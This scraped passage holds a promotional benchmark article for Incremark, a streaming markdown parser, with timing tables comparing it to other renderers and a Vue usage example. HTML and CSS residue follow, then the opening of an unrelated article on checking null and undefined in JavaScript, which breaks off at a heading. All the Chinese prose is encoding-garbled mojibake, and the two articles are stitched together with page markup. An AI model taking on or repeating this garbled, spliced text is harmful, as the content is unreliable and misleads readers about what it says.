<p>æˆ‘ä»¬å¯¹ <strong>38 ä¸ªçœŸå® markdown æ–‡ä»¶</strong>è¿›è¡Œäº†åŸºå‡†æµ‹è¯•â€”â€”AI å¯¹è¯ã€æ–‡æ¡£ã€ä»£ç åˆ†ææŠ¥å‘Šã€‚ä¸æ˜¯åˆæˆæµ‹è¯•æ•°æ®ã€‚æ€»è®¡ï¼š6,484 è¡Œï¼Œ128.55 KBã€‚</p>
<p>å®Œæ•´æ•°æ®è¡¨ï¼š</p>


























































































































<table><thead><tr><th>æ–‡ä»¶</th><th>è¡Œæ•°</th><th>å¤§å°</th><th>Incremark</th><th>Streamdown</th><th>markstream-vue</th><th>ant-design-x</th></tr></thead><tbody><tr><td>test-footnotes-simple.md</td><td>15</td><td>0.09 KB</td><td>0.3 ms</td><td>0.0 ms</td><td>1.4 ms</td><td>0.2 ms</td></tr><tr><td>simple-paragraphs.md</td><td>16</td><td>0.41 KB</td><td>0.9 ms</td><td>0.9 ms</td><td>5.9 ms</td><td>1.0 ms</td></tr><tr><td>introduction.md</td><td>34</td><td>1.57 KB</td><td>5.6 ms</td><td>12.6 ms</td><td>75.6 ms</td><td>12.8 ms</td></tr><tr><td>footnotes.md</td><td>52</td><td>0.94 KB</td><td>1.7 ms</td><td>0.2 ms</td><td>10.6 ms</td><td>1.9 ms</td></tr><tr><td>concepts.md</td><td>91</td><td>4.29 KB</td><td>12.0 ms</td><td>50.5 ms</td><td>381.9 ms</td><td>53.6 ms</td></tr><tr><td>comparison.md</td><td>109</td><td>5.39 KB</td><td>20.5 ms</td><td>74.0 ms</td><td>552.2 ms</td><td>85.2 ms</td></tr><tr><td>complex-html-examples.md</td><td>147</td><td>3.99 KB</td><td>9.0 ms</td><td>58.8 ms</td><td>279.3 ms</td><td>57.2 ms</td></tr><tr><td>FOOTNOTE_FIX_SUMMARY.md</td><td>236</td><td>3.93 KB</td><td>22.7 ms</td><td>0.5 ms</td><td>535.0 ms</td><td>120.8 ms</td></tr><tr><td>OPTIMIZATION_SUMMARY.md</td><td>391</td><td>6.24 KB</td><td>19.1 ms</td><td>208.4 ms</td><td>980.6 ms</td><td>217.8 ms</td></tr><tr><td>BLOCK_TRANSFORMER_ANALYSIS.md</td><td>489</td><td>9.24 KB</td><td>75.7 ms</td><td>574.3 ms</td><td>1984.1 ms</td><td>619.9 ms</td></tr><tr><td>test-md-01.md</td><td>916</td><td>17.67 KB</td><td>87.7 ms</td><td>1441.1 ms</td><td>5754.7 ms</td><td>1656.9 ms</td></tr><tr><td><strong>æ€»è®¡ (38 æ–‡ä»¶)</strong></td><td><strong>6484</strong></td><td><strong>128.55 KB</strong></td><td><strong>519.4 ms</strong></td><td><strong>3190.3 ms</strong></td><td><strong>14683.9 ms</strong></td><td><strong>3728.6 ms</strong></td></tr></tbody></table>
<h4 data-id="heading-6">è¯šå®é¢å¯¹ï¼šæˆ‘ä»¬æ…¢çš„åœ°æ–¹</h4>
<p>ä½ ä¼šæ³¨æ„åˆ°æ•°æ®ä¸­æœ‰äº›å¥‡æ€ªçš„åœ°æ–¹ã€‚å¯¹äº <code>footnotes.md</code> å’Œ <code>FOOTNOTE_FIX_SUMMARY.md</code>ï¼ŒStreamdown çœ‹èµ·æ¥å¿«å¾—å¤šï¼š</p>























<table><thead><tr><th>æ–‡ä»¶</th><th>Incremark</th><th>Streamdown</th><th>åŸå› </th></tr></thead><tbody><tr><td>footnotes.md</td><td>1.7 ms</td><td>0.2 ms</td><td>Streamdown ä¸æ”¯æŒè„šæ³¨</td></tr><tr><td>FOOTNOTE_FIX_SUMMARY.md</td><td>22.7 ms</td><td>0.5 ms</td><td>åŒä¸Šâ€”â€”å®ƒç›´æ¥è·³è¿‡äº†</td></tr></tbody></table>
<p><strong>è¿™ä¸æ˜¯æ€§èƒ½é—®é¢˜â€”â€”è¿™æ˜¯åŠŸèƒ½å·®å¼‚ã€‚</strong></p>
<p>å½“ Streamdown é‡åˆ° <code>[^1]</code> è„šæ³¨è¯­æ³•æ—¶ï¼Œå®ƒç›´æ¥å¿½ç•¥ã€‚Incremark å®Œæ•´å®ç°äº†è„šæ³¨â€”â€”è€Œä¸”æˆ‘ä»¬å¿…é¡»è§£å†³ä¸€ä¸ªæµå¼åœºæ™¯ç‰¹æœ‰çš„æ£˜æ‰‹é—®é¢˜ï¼š</p>
<p>åœ¨æµå¼åœºæ™¯ä¸­ï¼Œ<strong>å¼•ç”¨é€šå¸¸æ¯”å®šä¹‰å…ˆåˆ°è¾¾</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">Chunk <span class="hljs-number">1</span>: <span class="hljs-string">"è¯¦è§è„šæ³¨[^1]..."</span>           <span class="hljs-comment">// å¼•ç”¨å…ˆåˆ°è¾¾</span>
Chunk <span class="hljs-number">2</span>: <span class="hljs-string">"æ›´å¤šå†…å®¹..."</span>
Chunk <span class="hljs-number">3</span>: <span class="hljs-string">"[^1]: è¿™æ˜¯è„šæ³¨å®šä¹‰"</span>        <span class="hljs-comment">// å®šä¹‰ååˆ°è¾¾</span>
</code></pre>
<p>ä¼ ç»Ÿè§£æå™¨å‡è®¾ä½ æœ‰å®Œæ•´çš„æ–‡æ¡£ã€‚æˆ‘ä»¬æ„å»ºäº†"ä¹è§‚å¼•ç”¨"æœºåˆ¶ï¼Œåœ¨æµå¼ä¼ è¾“è¿‡ç¨‹ä¸­ä¼˜é›…åœ°å¤„ç†ä¸å®Œæ•´çš„é“¾æ¥/å›¾ç‰‡ï¼Œç„¶ååœ¨å®šä¹‰åˆ°è¾¾æ—¶è§£æå®ƒä»¬ã€‚</p>
<p>æˆ‘ä»¬é€‰æ‹©å®Œæ•´å®ç°è„šæ³¨ã€æ•°å­¦å…¬å¼å—ï¼ˆ<code>$...$</code>ï¼‰å’Œè‡ªå®šä¹‰å®¹å™¨ï¼ˆ<code>:::tip</code>ï¼‰ï¼Œå› ä¸ºè¿™äº›æ˜¯çœŸå® AI å†…å®¹æ‰€éœ€è¦çš„ã€‚</p>
<h4 data-id="heading-7">æˆ‘ä»¬çœŸæ­£çš„ä¼˜åŠ¿</h4>
<p>æ’é™¤è„šæ³¨æ–‡ä»¶ï¼Œçœ‹çœ‹æ ‡å‡† markdown çš„æ€§èƒ½ï¼š</p>















































<table><thead><tr><th>æ–‡ä»¶</th><th>è¡Œæ•°</th><th>Incremark</th><th>Streamdown</th><th>ä¼˜åŠ¿</th></tr></thead><tbody><tr><td>concepts.md</td><td>91</td><td>12.0 ms</td><td>50.5 ms</td><td><strong>4.2x</strong></td></tr><tr><td>comparison.md</td><td>109</td><td>20.5 ms</td><td>74.0 ms</td><td><strong>3.6x</strong></td></tr><tr><td>complex-html-examples.md</td><td>147</td><td>9.0 ms</td><td>58.8 ms</td><td><strong>6.6x</strong></td></tr><tr><td>OPTIMIZATION_SUMMARY.md</td><td>391</td><td>19.1 ms</td><td>208.4 ms</td><td><strong>10.9x</strong></td></tr><tr><td>test-md-01.md</td><td>916</td><td>87.7 ms</td><td>1441.1 ms</td><td><strong>16.4x</strong></td></tr></tbody></table>
<p><strong>è§„å¾‹å¾ˆæ˜æ˜¾ï¼šæ–‡æ¡£è¶Šå¤§ï¼Œæˆ‘ä»¬çš„ä¼˜åŠ¿è¶Šå¤§ã€‚</strong></p>
<p>å¯¹äºæœ€å¤§çš„æ–‡ä»¶ï¼ˆ17.67 KBï¼‰ï¼š</p>
<ul>
<li><strong>Incremark</strong>ï¼š88 ms</li>
<li><strong>ant-design-x</strong>ï¼š1,657 msï¼ˆæ…¢ 18.9 å€ï¼‰</li>
<li><strong>markstream-vue</strong>ï¼š5,755 msï¼ˆæ…¢ 65.6 å€ï¼‰</li>
</ul>
<h4 data-id="heading-8">ä¸ºä»€ä¹ˆå·®è·è¿™ä¹ˆå¤§ï¼Ÿ</h4>
<p>è¿™å°±æ˜¯ O(n) vs O(nÂ²) çš„å®é™…è¡¨ç°ã€‚</p>
<p>ä¼ ç»Ÿè§£æå™¨æ¯æ¬¡æ”¶åˆ°æ–° chunk éƒ½é‡æ–°è§£ææ•´ä¸ªæ–‡æ¡£ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">200</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(100</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">300</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">(200</span> <span class="hljs-string">æ—§</span> <span class="hljs-string">+</span> <span class="hljs-number">100</span> <span class="hljs-string">æ–°)</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">10</span><span class="hljs-string">,000</span> <span class="hljs-string">å­—ç¬¦</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 + 200 + ... + 10,000 = 5,050,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>Incremark åªå¤„ç†æ–°å†…å®¹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Chunk 1:</span> <span class="hljs-string">è§£æ</span> <span class="hljs-number">100</span> <span class="hljs-string">å­—ç¬¦</span> <span class="hljs-string">â†’</span> <span class="hljs-string">ç¼“å­˜ç¨³å®šå—</span>
<span class="hljs-attr">Chunk 2:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-attr">Chunk 3:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
<span class="hljs-string">...</span>
<span class="hljs-attr">Chunk 100:</span> <span class="hljs-string">åªè§£æ</span> <span class="hljs-string">~100</span> <span class="hljs-string">æ–°å­—ç¬¦</span>
</code></pre>
<p>æ€»å·¥ä½œé‡ï¼š<code>100 Ã— 100 = 10,000</code> å­—ç¬¦æ“ä½œã€‚</p>
<p>è¿™æ˜¯ <strong>500 å€çš„å·®è·</strong>ã€‚è€Œä¸”éšç€æ–‡æ¡£å¢é•¿ï¼Œå·®è·åªä¼šæ›´å¤§ã€‚</p>
<h4 data-id="heading-9">ä»€ä¹ˆæ—¶å€™ç”¨ Incremark</h4>
<p>âœ… <strong>é€‚åˆä½¿ç”¨ Incremark çš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>AI èŠå¤©æµå¼è¾“å‡ºï¼ˆClaudeã€ChatGPT ç­‰ï¼‰</li>
<li>é•¿ç¯‡ AI å†…å®¹ï¼ˆæ¨ç†æ¨¡å‹ã€ä»£ç ç”Ÿæˆï¼‰</li>
<li>å®æ—¶ markdown ç¼–è¾‘å™¨</li>
<li>éœ€è¦è„šæ³¨ã€æ•°å­¦å…¬å¼æˆ–è‡ªå®šä¹‰å®¹å™¨çš„å†…å®¹</li>
<li>100K+ token çš„å¯¹è¯</li>
</ul>
<p>âš ï¸ <strong>è€ƒè™‘ä½¿ç”¨å…¶ä»–æ–¹æ¡ˆçš„åœºæ™¯ï¼š</strong></p>
<ul>
<li>ä¸€æ¬¡æ€§é™æ€ markdown æ¸²æŸ“ï¼ˆç›´æ¥ç”¨ marked å°±è¡Œï¼‰</li>
<li>éå¸¸å°çš„æ–‡ä»¶ï¼ˆ&lt;500 å­—ç¬¦ï¼‰â€”â€”å¼€é”€ä¸å€¼å¾—</li>
</ul>
<h3 data-id="heading-10">åŒå¼•æ“ï¼Œä¸€ä¸ªç›®æ ‡</h3>
<p><strong>Marked è¿˜æ˜¯ Micromarkï¼Ÿ</strong> ä¸¤è€…å„æœ‰å–èˆã€‚</p>
<p>Marked æå¿«ä½†ç¼ºå°‘é«˜çº§åŠŸèƒ½ã€‚Micromark è§„èŒƒå®Œç¾ä½†æ›´é‡ã€‚</p>
<p>æˆ‘ä»¬çš„ç­”æ¡ˆï¼š<strong>ä¸¤ä¸ªéƒ½æ”¯æŒã€‚</strong></p>




















<table><thead><tr><th>å¼•æ“</th><th>é€Ÿåº¦</th><th>æœ€ä½³åœºæ™¯</th></tr></thead><tbody><tr><td><strong>Marked</strong>ï¼ˆé»˜è®¤ï¼‰</td><td>âš¡âš¡âš¡âš¡âš¡</td><td>å®æ—¶æµå¼ã€AI å¯¹è¯</td></tr><tr><td><strong>Micromark</strong></td><td>âš¡âš¡âš¡</td><td>å¤æ‚æ–‡æ¡£ã€ä¸¥æ ¼ CommonMark</td></tr></tbody></table>
<p>æˆ‘ä»¬ç”¨è‡ªå®šä¹‰ tokenizer æ‰©å±•äº† Markedï¼Œæ”¯æŒè„šæ³¨ã€æ•°å­¦å…¬å¼å’Œå®¹å™¨ã€‚å¦‚æœé‡åˆ° Marked æ— æ³•å¤„ç†çš„è¾¹ç•Œæƒ…å†µï¼Œåªéœ€ä¸€ä¸ªé…ç½®å°±èƒ½åˆ‡æ¢åˆ° Micromarkã€‚</p>
<p>ä¸¤ä¸ªå¼•æ“äº§ç”Ÿå®Œå…¨ç›¸åŒçš„ <strong>mdast</strong> è¾“å‡ºã€‚ä½ çš„æ¸²æŸ“ä»£ç ä¸å…³å¿ƒåº•å±‚ç”¨çš„æ˜¯å“ªä¸ªå¼•æ“ã€‚</p>
<h3 data-id="heading-11">æ²¡äººè°ˆè®ºçš„æ‰“å­—æœºé—®é¢˜</h3>
<p>ä½ çŸ¥é“ ChatGPT é‚£ç§ä¸æ»‘çš„"æ‰“å­—"æ•ˆæœå—ï¼Ÿå¤§å¤šæ•°å®ç°æ˜¯è¿™æ ·åšçš„ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">displayText = fullText.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, currentIndex)
</code></pre>
<p>è¿™ä¼šä¸æ–­ç ´å markdownã€‚ä½ ä¼šçœ‹åˆ°æ¸²æŸ“åˆ°ä¸€åŠçš„ <code>**ç²—ä½“**</code> æ ‡ç­¾ã€é—ªçƒçš„ä»£ç å—ã€çœ‹èµ·æ¥åƒå–é†‰äº†çš„è¯­æ³•ã€‚</p>
<p>æˆ‘ä»¬æŠŠåŠ¨ç”»ç§»åˆ°äº† <strong>AST å±‚</strong>ã€‚æˆ‘ä»¬çš„ <code>BlockTransformer</code> ç†è§£ç»“æ„â€”â€”å®ƒåœ¨èŠ‚ç‚¹<em>å†…éƒ¨</em>åšåŠ¨ç”»ï¼Œæ°¸è¿œä¸ä¼šè·¨èŠ‚ç‚¹ã€‚ç»“æœï¼šä¸æ»‘æµç•…çš„æ‰“å­—æ•ˆæœï¼ŒåŒæ—¶å°Šé‡ markdown è¯­ä¹‰ã€‚</p>
<h3 data-id="heading-12">åŠ¨æ‰‹è¯•è¯•</h3>
<pre><code class="hljs language-bash" lang="bash">npm install @incremark/vue  <span class="hljs-comment"># æˆ– reactã€svelte</span>
</code></pre>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { ref } from 'vue'
import { IncremarkContent } from '@incremark/vue'

const content = ref('')
const isFinished = ref(false)

async function handleStream(stream) {
  for await (const chunk of stream) {
    content.value += chunk
  }
  isFinished.value = true
}
&lt;/script&gt;

&lt;template&gt;
  &lt;IncremarkContent 
    :content="content" 
    :is-finished="isFinished"
    :incremark-options="{ gfm: true, math: true }"
  /&gt;
&lt;/template&gt;
</code></pre>
<p>æˆ‘ä»¬æ”¯æŒ <strong>Vue 3</strong>ã€<strong>React 18</strong> å’Œ <strong>Svelte 5</strong>ï¼ŒAPI å®Œå…¨ä¸€è‡´ã€‚ä¸€ä¸ªæ ¸å¿ƒï¼Œä¸‰ä¸ªæ¡†æ¶ï¼Œé›¶è¡Œä¸ºå·®å¼‚ã€‚</p>
<h3 data-id="heading-13">ä¸‹ä¸€æ­¥</h3>
<p>è¿™æ˜¯ 0.3.0 ç‰ˆæœ¬ã€‚æˆ‘ä»¬æ‰åˆšåˆšå¼€å§‹ã€‚</p>
<p>AI ä¸–ç•Œæ­£åœ¨èµ°å‘æ›´é•¿çš„è¾“å‡ºã€æ›´å¤æ‚çš„æ¨ç†è½¨è¿¹ã€æ›´ä¸°å¯Œçš„æ ¼å¼ã€‚ä¼ ç»Ÿè§£æå™¨è·Ÿä¸ä¸Šâ€”â€”å®ƒä»¬çš„ O(nÂ²) æ¶æ„æ³¨å®šå¦‚æ­¤ã€‚</p>
<p>æˆ‘ä»¬å¼€å‘ Incremark æ˜¯å› ä¸ºæˆ‘ä»¬è‡ªå·±éœ€è¦å®ƒã€‚å¸Œæœ›ä½ ä¹Ÿè§‰å¾—å®ƒæœ‰ç”¨ã€‚</p>
<hr/>
<p>ğŸ“š <strong>æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.incremark.com%2F" target="_blank" title="https://www.incremark.com/" ref="nofollow noopener noreferrer">incremark.com</a>
ğŸ’» <strong>GitHub</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkingshuaishuai%2Fincremark" target="_blank" title="https://github.com/kingshuaishuai/incremark" ref="nofollow noopener noreferrer">kingshuaishuai/incremark</a>
ğŸ® <strong>åœ¨çº¿æ¼”ç¤º</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-vue.vercel.app%2F" target="_blank" title="https://incremark-vue.vercel.app/" ref="nofollow noopener noreferrer">Vue</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-react.vercel.app%2F" target="_blank" title="https://incremark-react.vercel.app/" ref="nofollow noopener noreferrer">React</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fincremark-svelte.vercel.app%2F" target="_blank" title="https://incremark-svelte.vercel.app/" ref="nofollow noopener noreferrer">Svelte</a></p>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¸®ä½ èŠ‚çœäº†è°ƒè¯•æ—¶é—´ï¼Œå» GitHub ç‚¹ä¸ª â­ï¸ å§ã€‚æœ‰é—®é¢˜ï¼Ÿå¼€ä¸ª issue æˆ–è€…åœ¨ä¸‹é¢ç•™è¨€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript ä¸­å¦‚ä½•æ­£ç¡®åˆ¤æ–­ null å’Œ undefinedï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592550891538939923</link>    <guid>https://juejin.cn/post/7592550891538939923</guid>    <pubDate>2026-01-08T03:34:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592550891538939923" data-draft-id="7582845425402134568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript ä¸­å¦‚ä½•æ­£ç¡®åˆ¤æ–­ null å’Œ undefinedï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T03:34:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å¤§å"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript ä¸­å¦‚ä½•æ­£ç¡®åˆ¤æ–­ null å’Œ undefinedï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å¤§å
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:34:44.000Z" title="Thu Jan 08 2026 03:34:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›¸ä¿¡å†™å‰ç«¯å¼€å‘çš„æœ‹å‹å¯¹ä¸‹é¢è¿™ç§æŠ¥é”™åº”è¯¥å¾ˆç†Ÿæ‚‰ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">Cannot read properties of undefined
</code></pre>
<p>æœ‰ä¸€æ¬¡æˆ‘åŠ ç­å¤„ç†é—®é¢˜ï¼Œä¹Ÿæ˜¯å› ä¸ºè¿™ä¸€ä¸ªbugã€‚</p>
<p>åæ¥æ‰å‘ç°ï¼ŒåŸæ¥æ˜¯ä¸€ä¸ªæ¥å£è¿”å›çš„æ•°æ®é‡Œï¼ŒæŸä¸ªå­—æ®µæœ‰æ—¶å€™æ˜¯nullå¯¼è‡´çš„ï¼Œè€Œæˆ‘æ²¡æœ‰åšåˆ¤æ–­å°±ç›´æ¥ä½¿ç”¨äº†ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦åˆ¤æ–­ç©ºå€¼ï¼Ÿ</h2>
<p>ä¸¾ä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åœºæ™¯1ï¼šç”¨æˆ·æ²¡å¡«å§“å</span>
<span class="hljs-keyword">const</span> userName = <span class="hljs-literal">undefined</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userName.<span class="hljs-property">length</span>); <span class="hljs-comment">// æŠ¥é”™ï¼Cannot read properties of undefined</span>

<span class="hljs-comment">// åœºæ™¯2ï¼šæ¥å£è¿”å›ç©ºæ•°æ®</span>
<span class="hljs-keyword">const</span> apiResponse = <span class="hljs-literal">null</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(apiResponse.<span class="hljs-property">data</span>); <span class="hljs-comment">// æŠ¥é”™ï¼Cannot read properties of null</span>
</code></pre>
<p>æ‰€ä»¥ï¼Œç©ºå€¼åˆ¤æ–­æ˜¯ä¿è¯ä»£ç å¥å£®æ€§çš„é‡è¦ç¯èŠ‚ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€å…ˆææ‡‚ï¼šnull å’Œ undefined æœ‰å•¥åŒºåˆ«ï¼Ÿ</h2>
<p>è™½ç„¶å®ƒä»¬éƒ½è¡¨ç¤ºç©ºï¼Œä½†å«ä¹‰ä¸åŒï¼š</p>
<p><strong><code>undefined</code></strong>ï¼šå˜é‡è¢«å£°æ˜äº†ï¼Œä½†è¿˜æ²¡èµ‹å€¼ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> name;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name); <span class="hljs-comment">// undefined</span>
</code></pre>
<p><strong><code>null</code></strong>ï¼šç¨‹åºå‘˜ä¸»åŠ¨èµ‹å€¼ä¸ºç©ºï¼Œè¡¨ç¤ºæˆ‘æ˜ç¡®çŸ¥é“è¿™é‡Œæ²¡æœ‰å€¼ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> user = <span class="hljs-literal">null</span>; <span class="hljs-comment">// è¡¨ç¤ºâ€œç”¨æˆ·ä¸å­˜åœ¨â€</span>
</code></pre>
<p>æ‰€ä»¥ï¼Œå½“æˆ‘ä»¬è¯´åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºç©ºï¼Œé€šå¸¸æ˜¯æŒ‡ï¼šå®ƒæ˜¯ä¸æ˜¯ <code>null</code> æˆ– <code>undefined</code>ã€‚</p>
<hr/>
<h2 data-id="heading-2">åˆ¤æ–­æ–¹æ³•</h2>
